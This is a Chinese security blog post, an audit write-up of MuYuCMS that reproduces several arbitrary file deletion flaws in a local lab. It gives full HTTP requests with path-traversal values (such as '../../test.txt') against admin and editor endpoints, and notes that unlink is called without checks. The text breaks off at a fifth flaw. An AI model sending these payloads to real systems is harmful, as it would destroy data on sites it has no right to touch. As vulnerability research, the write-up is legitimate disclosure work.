---
title: 木鱼cms 审计小结
url: https://www.secpulse.com/archives/196548.html
source: 安全脉搏
date: 2023-02-24
fetch_date: 2025-10-04T07:55:46.843383
---

# 木鱼cms 审计小结

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 木鱼cms 审计小结

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-02-23

8,702

MuYuCMS基于Thinkphp开发的一套轻量级开源内容管理系统,专注为公司企业、个人站长提供快速建站提供解决方案。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130920.png "null")

　　‍环境搭建

　　我们利用 phpstudy 来搭建环境，选择 Apache2.4.39 + MySQL5.7.26+ php5.6.9 ，同时利用 PhpStorm 来实现对项目的调试

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130921.png "null")

　　‍漏洞复现分析

### 任意文件删除

　　我们在网站的根目录下创建一个文件 test.txt 用来校验文件是否被删除

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130924.png "null")

#### 任意文件删除一

#### 漏洞复现

　　登录后台后构造数据包

```
POST /admin.php/accessory/filesdel.html HTTP/1.1
Host: test.test
Content-Length: 55
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://test.test
Referer: http://test.test/admin.php/accessory/filelist.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: muyu_checkaccre=1676530347; PHPSESSID=ae5mpn24ivb25od6st8sdoouf7; muyu_first=1676531718;XDEBUG_SESSION=PHPSTORM
Connection: close

filedelur=/upload/files/.gitignore/../../../../test.txt
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130925.png "null")

　　文件被成功删除

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130926.png "null")

#### 漏洞分析

`appadmincontrollerAccessory::filesdel`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130929.png "null")

　　通过参数 $filedelurl 拼接得到要删除文件的地址，利用 unlink 函数删除文件，中间没有做任何校验

#### 任意文件删除二

#### 漏洞复现

　　登录后台后构造数据包

```
POST /admin.php/accessory/picdel.html HTTP/1.1
Host: test.test
Content-Length: 54
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://test.test
Referer: http://test.test/admin.php/accessory/filelist.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: muyu_checkaccre=1676530347; PHPSESSID=ae5mpn24ivb25od6st8sdoouf7; muyu_first=1676531718;XDEBUG_SESSION=PHPSTORM
Connection: close

picdelur=/upload/files/.gitignore/../../../../test.txt
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130930.png "null")

#### 漏洞分析

`appadmincontrollerAccessory::picdel`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130933.png "null")

　　通过参数 $picdelur 拼接得到要删除图片的地址，利用 unlink 函数删除文件，中间没有做任何校验

#### 任意文件删除三

#### 漏洞复现

　　登录后台后构造数据包

```
GET /editor/index.php?a=delete_node&type=file&path=F:/Tools/phpstudy_pro/WWW/MuYuCMS-master/MuYuCMS-master/template/../test.txt HTTP/1.1
Host: test.test
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://test.test
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://test.test/editor/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: muyu_checkaccre=1676601856; PHPSESSID=94241isj4cqrr0nefhv9rvs1b2;XDEBUG_SESSION=PHPSTORM
Connection: close
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130934.png "null")

　　‍

#### 漏洞分析

`AppControllerController::delete_node`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130936.png "null")

`AppCoreFile::deleteFile`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130937.png "null")

`AppControllerController::beforeFun`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130938.png "null")

　　对传入的 path 判断了是否在合法的文件域中，但没有对传入的 path 没有进行跨目录的校验就删除了文件

　　‍

#### 任意文件删除四

#### 漏洞复现

```
POST /admin.php/database/sqldel.html HTTP/1.1
Host: test.test
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://test.test
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://test.test/editor/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: muyu_checkaccre=1676601856; PHPSESSID=94241isj4cqrr0nefhv9rvs1b2;XDEBUG_SESSION=PHPSTORM
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

name=../../test.txt
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130939.png "null")

#### 漏洞分析

`appadmincontrollerDatabase::sqldel`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130941.png "null")

　　获取 post 传入的参数 name

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196548-1677130942.png "null")

　　利用 delFile 函数删除文件

#### 任意文件删除五

#### 漏洞...